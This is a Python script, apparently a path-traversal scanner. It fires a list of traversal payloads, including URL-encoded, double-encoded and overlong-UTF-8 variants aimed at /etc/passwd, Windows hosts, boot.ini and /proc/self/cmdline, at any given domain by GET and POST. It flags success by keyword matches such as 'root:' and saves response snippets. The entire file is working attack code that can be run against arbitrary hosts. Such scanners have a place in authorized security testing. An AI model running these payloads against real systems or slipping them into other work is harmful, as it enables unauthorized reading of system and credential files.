import time
import requests
from urllib.parse import quote, urljoin

PAYLOADS = [
    "etc/passwd",
    "../etc/passwd",
    "../../etc/passwd",
    "../../../../etc/passwd",
    "../////etc////passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252Fetc%252Fpasswd",
    "....//....//etc/passwd",
    "..%c0%afetc%c0%afpasswd",
    "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    "..%5C..%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts",
    "C:/Windows/System32/drivers/etc/hosts",
    "../../../../../../../../../../proc/self/cmdline",
    "../../../../../../../../../../boot.ini"
]

DEFAULT_KEYWORDS = [
    "root:", "/bin/bash", "[boot loader]", "localhost", 
    "for 16-bit app support", "SystemRoot", "administrator", "cmdline"
]

def contains_sensitive(response_text, keywords):
    if not response_text:
        return False
    low = response_text.lower()
    for kw in keywords:
        if kw.lower() in low:
            return True
    return False

def _safe_text_snippet(text, length=300):
    if not text:
        return ""
    # Trim, replace newlines with spaces, and strip surrounding whitespace
    return text[:length].replace('\n', ' ').strip()

def check_path_traversal(domain: str, vuln_endpoint: str, post_params: list = None, timeout: int = 7, delay: float = 0.3) -> dict:
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) path-traversal-checker/2.1",
        "Referer": domain
    })
    
    keywords = DEFAULT_KEYWORDS[:]
    results = []
    vulnerable_status = False

    domain = domain.rstrip('/')
    base_url = domain + vuln_endpoint

    # --- 1. Establish Baseline ---
    baseline_text = ""
    try:
        baseline_resp = session.get(base_url + "random_nonexistent_file_xyz", timeout=timeout)
        content_type = baseline_resp.headers.get('Content-Type', '')
        if 'text' in content_type or 'json' in content_type or content_type == "":
            baseline_text = baseline_resp.text
    except requests.RequestException as e:
        results.append({"error": f"Baseline request failed: {e}", "vulnerable": False, "snippet": ""})
        baseline_text = "" 
        
    baseline_len = len(baseline_text)
    
    if post_params is None or not post_params:
        post_params_to_test = ["file", "filename", "path", "id"]
    else:
        post_params_to_test = post_params

    # --- 2. Iterate over Payloads ---
    for payload in PAYLOADS:
        variants = [payload, quote(payload, safe='')]

        # --- GET Requests ---
        for variant in variants:
            full_url = base_url + variant
            
            rec = {
                "payload": payload,
                "variant": variant,
                "url": full_url,
                "method": "GET",
                "vulnerable": False,
                "snippet": ""  # Ensure snippet is initialized
            }

            try:
                resp = session.get(full_url, timeout=timeout)
                status = resp.status_code
                content_type = resp.headers.get("Content-Type", "")
                
                resp_text = resp.text if "text" in content_type or "json" in content_type or content_type == "" else ""
                snippet = _safe_text_snippet(resp_text, 300)
                length_diff = abs(len(resp_text) - baseline_len)

                flagged = False
                reason = "No Issue Detected"
                
                if status == 200:
                    if contains_sensitive(resp_text, keywords):
                        flagged = True
                        reason = "Keyword Match in 200 OK"
                    elif length_diff > 300:  
                        flagged = True
                        reason = f"Significant Length Difference (>300 vs Baseline {baseline_len})"
                
                if flagged:
                    vulnerable_status = True
                    reason = f"VULNERABLE: {reason}"
                
                rec.update({
                    "status_code": status,
                    "content_type": content_type,
                    "len_diff": length_diff,
                    "vulnerable": flagged,
                    "reason": reason,
                    "snippet": snippet
                })
                results.append(rec)

                if flagged:
                    break 
            except requests.exceptions.RequestException as e:
                rec.update({"error": str(e), "reason": "Request Error", "snippet": ""})
                results.append(rec)
            
            time.sleep(delay)

        if vulnerable_status and rec.get("vulnerable"):
            continue

        # --- POST Requests ---
        for variant in variants:
            for param in post_params_to_test:
                data = {param: variant}
                
                rec = {
                    "payload": payload,
                    "variant": variant,
                    "url": base_url,
                    "method": "POST",
                    "post_param": param,
                    "vulnerable": False,
                    "snippet": "" # Ensure snippet is initialized
                }
                
                try:
                    resp = session.post(base_url, data=data, timeout=timeout)
                    status = resp.status_code
                    content_type = resp.headers.get("Content-Type", "")
                    
                    resp_text = resp.text if "text" in content_type or "json" in content_type or content_type == "" else ""
                    snippet = _safe_text_snippet(resp_text, 300)
                    length_diff = abs(len(resp_text) - baseline_len)

                    flagged = False
                    reason = "No Issue Detected"
                    
                    if status == 200:
                        if contains_sensitive(resp_text, keywords):
                            flagged = True
                            reason = "Keyword Match in 200 OK"
                        elif length_diff > 300:
                            flagged = True
                            reason = f"Significant Length Difference (>300 vs Baseline {baseline_len})"

                    if flagged:
                        vulnerable_status = True
                        reason = f"VULNERABLE: {reason}"
                        
                    rec.update({
                        "content_type": content_type,
                        "len_diff": length_diff,
                        "vulnerable": flagged,
                        "reason": reason,
                        "snippet": snippet
                    })
                    results.append(rec)
                    
                    if flagged:
                        break 
                except requests.exceptions.RequestException as e:
                    rec.update({"error": str(e), "reason": "Request Error", "snippet": ""})
                    results.append(rec)
                
                time.sleep(delay)
            
            if vulnerable_status and rec.get("vulnerable"):
                break 
        
        if vulnerable_status and rec.get("vulnerable"):
            continue

    return {
        "vulnerability_found": vulnerable_status,
        "detailed_logs": results
    }

